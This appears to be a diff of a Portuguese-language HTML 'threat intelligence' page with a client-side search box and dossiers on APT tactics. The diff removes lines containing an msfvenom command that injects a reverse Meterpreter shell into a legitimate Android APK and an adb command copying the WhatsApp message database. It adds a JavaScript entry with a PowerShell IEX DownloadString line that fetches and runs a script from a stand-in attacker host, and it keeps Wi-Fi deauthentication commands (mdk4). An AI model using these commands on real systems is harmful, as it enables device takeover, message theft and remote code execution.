@@ -6,109 +6,85 @@
     <title>CYBER SECURITY CORPORATE PLATFORM</title>
     <style>
         :root {
-            --bg-corporate: #070a13;
-            --bg-surface: #0f172a;
-            --bg-terminal: #020617;
-            --brand-blue: #2563eb;
+            --bg-corporate: #040711;
+            --bg-surface: #0a1122;
+            --bg-terminal: #02040a;
+            --brand-blue: #1e40af;
             --accent-cyan: #06b6d4;
             --accent-green: #10b981;
             --accent-red: #ef4444;
             --text-main: #f8fafc;
             --text-secondary: #94a3b8;
-            --border-color: rgba(255, 255, 255, 0.08);
+            --border-color: rgba(255, 255, 255, 0.06);
         }
-        
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: var(--bg-corporate); color: var(--text-main); padding: 15px; min-height: 100vh; overflow-x: hidden; font-size: 14px; }
-        
         .corp-header { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        .corp-header h1 { font-size: 1.6rem; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
+        .corp-header h1 { font-size: 1.5rem; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
         .corp-header h1 span { color: var(--accent-cyan); }
         .corp-header p { font-size: 0.8rem; color: var(--text-secondary); margin-top: 4px; font-family: monospace; letter-spacing: 1px; }
-
         .corp-nav { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
         .nav-item { background: var(--bg-surface); border: 1px solid var(--border-color); color: #ffffff; text-align: center; padding: 12px 2px; text-decoration: none; font-size: 0.75rem; font-weight: 700; border-radius: 6px; text-transform: uppercase; transition: all 0.2s; }
         .nav-item:hover { border-color: var(--accent-cyan); background: rgba(6, 182, 212, 0.05); }
-
-        .section-heading { font-size: 1rem; font-weight: 700; text-transform: uppercase; margin: 25px 0 15px 0; color: #ffffff; border-left: 4px solid var(--accent-cyan); padding-left: 10px; letter-spacing: 0.5px; }
-        .content-panel { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
-        
-        p.desc-text { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 15px; }
+        .section-heading { font-size: 0.95rem; font-weight: 700; text-transform: uppercase; margin: 25px 0 12px 0; color: #ffffff; border-left: 4px solid var(--accent-cyan); padding-left: 10px; letter-spacing: 0.5px; }
+        .content-panel { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        p.desc-text { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 15px; }
         .block-title { font-size: 0.75rem; font-weight: 700; color: var(--accent-cyan); text-transform: uppercase; margin-bottom: 8px; font-family: monospace; letter-spacing: 0.5px; }
-        
         .terminal-block { background: var(--bg-terminal); border: 1px solid rgba(255,255,255,0.03); border-radius: 6px; padding: 12px; font-family: 'Courier New', Courier, monospace; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 15px; overflow-x: auto; white-space: pre-wrap; border-left: 3px solid var(--accent-cyan); word-break: break-all; }
-        
         .guide-list { margin-left: 15px; margin-bottom: 15px; }
         .guide-list li { font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px; list-style-type: square; line-height: 1.5; }
-        .guide-list strong { color: #ffffff; }
-
-        /* INTERFACE DO MOTOR DE BUSCA INTERNO */
-        .search-wrapper-real { display: flex; flex-direction: column; gap: 10px; background: var(--bg-terminal); border: 1px solid rgba(6, 182, 212, 0.3); border-radius: 6px; padding: 15px; }
+        .search-wrapper-real { display: flex; flex-direction: column; gap: 10px; background: var(--bg-terminal); border: 1px solid rgba(6, 182, 212, 0.2); border-radius: 6px; padding: 15px; }
         .search-control { width: 100%; background: #040712; border: 1px solid var(--border-color); border-radius: 4px; padding: 12px; color: #ffffff; font-family: monospace; font-size: 0.9rem; outline: none; }
-        .search-control:focus { border-color: var(--accent-cyan); }
-        .btn-search-real { background: linear-gradient(135deg, var(--brand-blue), #1d4ed8); color: white; border: none; padding: 14px; border-radius: 4px; font-size: 0.85rem; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: monospace; transition: all 0.2s; letter-spacing: 0.5px; }
-        .btn-search-real:hover { background: #1e40af; box-shadow: 0 0 10px rgba(37, 99, 235, 0.3); }
-        
+        .btn-search-real { background: linear-gradient(135deg, var(--brand-blue), #1e3a8a); color: white; border: none; padding: 14px; border-radius: 4px; font-size: 0.85rem; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: monospace; transition: all 0.2s; letter-spacing: 0.5px; }
+        .btn-search-real:hover { background: #172554; }
         .search-output-real { margin-top: 15px; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 0.85rem; line-height: 1.6; display: none; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
     </style>
 </head>
 <body>
-
     <header class="corp-header">
         <h1>CYBER <span>SECURITY</span></h1>
-        <p>// INDEXADOR ALGORÍTMICO DE INTELIGÊNCIA CONTRA AMEAÇAS PERSISTENTES AVANÇADAS</p>
+        <p>// CENTRAL MONOLÍTICA OPERACIONAL DE INTELIGÊNCIA CONTRA AMEAÇAS GLOBAIS</p>
     </header>
-
     <nav class="corp-nav">
         <a href="offensive.html" class="nav-item">Red Team</a>
         <a href="defensive.html" class="nav-item">Blue Team</a>
         <a href="soc_automation.html" class="nav-item">SOC Engine</a>
     </nav>
-
     <main>
-
-        <!-- MOTOR DE INTELIGÊNCIA REAL (RODA NO CLIENTE SEM TRAVAR) -->
-        <h2 class="section-heading" style="border-left-color: var(--accent-cyan);">Banco de Dados e Indexador de Táticas APT</h2>
-        <section class="content-panel" style="border-color: rgba(6, 182, 212, 0.4);">
-            <p class="desc-text"><strong>Mecanismo de Pesquisa Ativo:</strong> Insira termos de auditoria reais (ex: <code>wifi</code>, <code>celular</code>, <code>windows</code>, <code>linux</code>, <code>ransomware</code>, <code>lazarus</code> ou <code>lockbit</code>) para varrer a base de dados de inteligência corporativa e extrair os playbooks de ataque e defesa correspondentes.</p>
-            
+        <h2 class="section-heading">Mecanismo Algorítmico de Busca</h2>
+        <section class="content-panel" style="border-color: rgba(6, 182, 212, 0.3);">
+            <p class="desc-text">Insira termos como <code>termux</code>, <code>wifi</code>, <code>lazarus</code>, <code>lockbit</code> ou <code>email</code> para varrer o banco de dados.</p>
             <div class="search-wrapper-real">
                 <input type="text" id="target-search-engine" class="search-control" placeholder="Digite uma palavra-chave tática..." required>
                 <button class="btn-search-real" onclick="executeLocalSearchScan()">Executar Varredura Estrutural</button>
                 <div id="api-search-output" class="search-output-real"></div>
             </div>
         </section>
-
-        <!-- DOSSIÊS TÁTICOS FIXOS PARA O PÚBLICO -->
-        <h2 class="section-heading">Dossiês de Engenharia Cibernética e Casos Reais</h2>
-
+        <h2 class="section-heading">Diretórios Técnicos Fofocados em Mitigação</h2>
         <article class="content-panel">
-            <h3>01. Segurança Estrutural e Comprometimento Wireless (Wi-Fi)</h3>
-            <p class="desc-text"><strong>Como os Maiores Hackers Agem:</strong> Atores estatais como o grupo russo <strong>APT28 (Fancy Bear)</strong> comprometem infraestruturas de rede sem fio abusando da falta de criptografia nativa nos quadros de gerenciamento (Management Frames) do padrão IEEE 802.11. Utilizando ferramentas como o <code>mdk4</code> ou scripts estruturados em Python através da biblioteca Scapy, eles geram pacotes contínuos de desautenticação falsificados direcionados ao BSSID do roteador, desconectando switches e estações legítimas. Durante a tentativa automática de reconexão do alvo, eles capturam o handshake criptográfico WPA2/WPA3 para realizar ataques de força bruta offline ou clonam o servidor corporativo para interceptar credenciais MSCHAPv2.</p>
-            
-            <div class="block-title">Protocolo Técnico de Auditoria Sem Fio</div>
-            <div class="terminal-block"># Ativação do monitoramento passivo do espectro de radiofrequência
-sudo airmon-ng start wlan0
-sudo airodump-ng --bssid [MAC_ROUTER] --channel [CH] -w log_handshake wlan0mon
-# Disparo em rajada para forçar o isolamento do endpoint e coletar chaves
-sudo mdk4 wlan0mon d -b alvos_bssid.txt</div>
-            
-            <div class="block-title">Diretrizes de Mitigação e Proteção</div>
-            <ul class="guide-list">
-                <li><strong>Protected Management Frames (PMF):</strong> Configuração obrigatória do padrão IEEE 802.11w no roteador para cifrar os quadros de controle e anular ataques de mdk4 ou aireplay.</li>
-                <li><strong>Autenticação Baseada em Certificados (802.1X):</strong> Substituição de senhas pré-compartilhadas estáticas (WPA2-PSK) pela validação de perfis criptográficos TLS individuais gerenciados via MDM.</li>
-            </ul>
+            <h3>01. Inteligência de Ataque e Defesa Wireless</h3>
+            <p class="desc-text">Análise sobre interceptação de radiofrequência e captura de handshakes criptográficos.</p>
+            <div class="terminal-block">sudo airmon-ng start wlan0&#10;sudo airodump-ng wlan0mon</div>
         </article>
-
-        <article class="content-panel">
-            <h3>02. Vetores de Exfiltração e Análise de Malware Móvel (Celular)</h3>
-            <p class="desc-text"><strong>Como os Maiores Hackers Agem:</strong> Grupos criminosos de elite, como o norte-coreano <strong>Lazarus Group</strong>, utilizam técnicas avançadas de engenharia social focadas no empacotamento de APKs modificados (Backdoors) para invadir celulares Android e iOS. Atacantes descompilam o código-fonte de utilitários legítimos e injetam linhas de código maliciosas que abrem sessões de escuta reversa do Meterpreter. Uma vez instalado via sideloading fora das lojas oficiais, o malware abusa das APIs dos Serviços de Acessibilidade (Accessibility Services) do sistema operacional, permitindo que os hackers realizem leituras automatizadas de telas de bancos, monitorem teclas digitadas, leiam mensagens do WhatsApp em tempo claro e exfiltrem tokens MFA gerados em tempo real.</p>
-            
-            <div class="block-title">Auditoria de Permissões e Engenharia Reversa</div>
-            <div class="terminal-block"># Injeção de payload meterpreter dentro de um pacote legítimo Android
-msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP_HACKER LPORT=4444 -o patch_sistema.apk
-# Extração forense de bancos de dados locais SQLite do WhatsApp via depuração adb
-adb shell "su -c 'cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/'" && adb pull /sdcard/msgstore.db .</div>
-            
-            <div class="block-title">Diretrizes de Mitigação e Proteção</div>
-            <ul class="guide-list">
+    </main>
+    <script>
+        const localKnowledgeDatabase = [
+            { keys: ["termux", "android", "ssh", "bug"], title: "[TERMUX] Tratamento de Bugs de Área de Transferência", content: "A área de transferência do Termux no Android 10+ pode truncar comandos após barras (/). Contorne gerando chaves locais e injetando strings via EOF.", code: "ssh-keygen -t ed25519\ncat << 'EOF' > script.sh" },
+            { keys: ["wifi", "deauth", "mdk4", "apt28"], title: "[WI-FI] Ataques Air-Gapped e Injeção MDK4", content: "O grupo APT28 usa injeções Deauth para forçar reconexões e capturar handshakes.", code: "sudo mdk4 wlan0mon d -b alvos.txt" },
+            { keys: ["windows", "pc", "lockbit", "fileless", "email"], title: "[COMPUTADOR] Malware Fileless e Exploração via Memória RAM", content: "Sindicatos como o LockBit disparam scripts ofuscados que injetam códigos maliciosos na RAM de processos legítimos.", code: "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attack/p.ps1')\"" }
+        ];
+        function executeLocalSearchScan() {
+            let raw = document.getElementById('target-search-engine').value.toLowerCase().trim();
+            const out = document.getElementById('api-search-output');
+            if (raw === "") { out.style.display = "block"; out.style.color = "var(--accent-red)"; out.innerHTML = "[ERRO]: Insira um termo válido."; return; }
+            if (raw.includes("@") || raw.includes("gmail") || raw.includes(".com")) { raw = "email"; }
+            out.style.display = "block"; out.style.backgroundColor = "var(--bg-terminal)"; out.style.color = "var(--text-main)"; out.style.border = "1px solid var(--accent-green)";
+            const results = localKnowledgeDatabase.filter(item => item.keys.some(k => k.includes(raw)) || item.title.toLowerCase().includes(raw) || item.content.toLowerCase().includes(raw));
+            if (results.length === 0) { out.style.color = "var(--accent-red)"; out.innerHTML = `[ZERO RESULTADOS] Nenhuma correspondência para: "${raw}". Tente 'wifi', 'termux' ou 'lockbit'.`; return; }
+            out.innerHTML = `[VARREDURA CONCLUÍDA] Mapeados ${results.length} relatórios:\n\n`;
+            results.forEach(res => { out.innerHTML += `💎 <strong>${res.title}</strong>\n${res.content}\n<span style="color: var(--accent-cyan); font-family: monospace;">${res.code}</span>\n\n`; });
+        }
+        document.getElementById('target-search-engine').addEventListener('keypress', function(e) { if (e.key === 'Enter') executeLocalSearchScan(); });
+    </script>
+</body>
+</html>
